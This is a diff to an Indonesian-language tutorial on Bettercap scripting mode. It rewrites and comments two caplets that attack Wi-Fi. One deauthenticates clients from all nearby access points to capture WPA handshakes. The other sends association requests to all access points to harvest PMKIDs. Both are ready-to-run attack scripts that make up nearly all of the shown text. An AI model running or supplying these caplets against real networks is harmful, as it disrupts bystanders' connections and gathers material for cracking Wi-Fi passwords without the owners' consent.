@@ -70,36 +70,52 @@ Mode Skrip (Scripting Mode) di Bettercap adalah mode yang memungkinkan pengguna 
     1. Capture Handshake:
    
         ```
-        # Script caplet Bettercap untuk capture Handshake
-        
+        # Script Caplet Bettercap untuk Capture Handshake
+
+        # Tentukan interface Wi-Fi yang digunakan
         set wifi.interface [INTERFACE]
+
+        # Tentukan file output untuk menyimpan handshake
         set wifi.handshakes.file [OUTPUT]
+
+        # Jangan gabungkan semua handshake ke satu file
         set wifi.handshakes.aggregate false
-        
-        # Mengaktifkan modul Wi-Fi untuk melakukan scanning.
+
+        # Mengaktifkan modul Wi-Fi untuk pemindaian jaringan
         wifi.recon on
 
-        # Jeda selama 30 detik
+        # Menunggu selama 30 detik agar pemindaian berjalan
         sleep 30
 
-        # Tidak mengirimkan Association Request ke semua AP
+        # Lewati Association Request ke semua AP
         set wifi.assoc.skip all
 
-        # Melakukan serangan deauth ke semua AP untuk mendapatkan handshake 
+        # Mengirim paket deauthentication ke semua AP untuk menangkap handshake
         wifi.deauth all
         ```
 
     2. Capture PMKID:
   
         ```
-        # Script caplet Bettercap untuk Capture PMKID
-        
+        # Script Caplet Bettercap untuk Capture PMKID
+
+        # Tentukan interface Wi-Fi yang digunakan
         set wifi.interface [INTERFACE]
+
+        # Tentukan file output untuk menyimpan hasil capture
         set wifi.handshakes.file [OUTPUT]
+
+        # Jangan gabungkan semua handshake/PMKID ke satu file
         set wifi.handshakes.aggregate false
+
+        # Mengaktifkan modul Wi-Fi untuk pemindaian jaringan
         wifi.recon on
-        wifi.show
-        wifi.assoc [BSSID]
+
+        # Menunggu selama 30 detik agar pemindaian berjalan
+        sleep 30
+
+        # Mengirim Association Request ke semua AP untuk menangkap PMKID
+        wifi.assoc all
         ```
 
 3. Jalankan caplet:
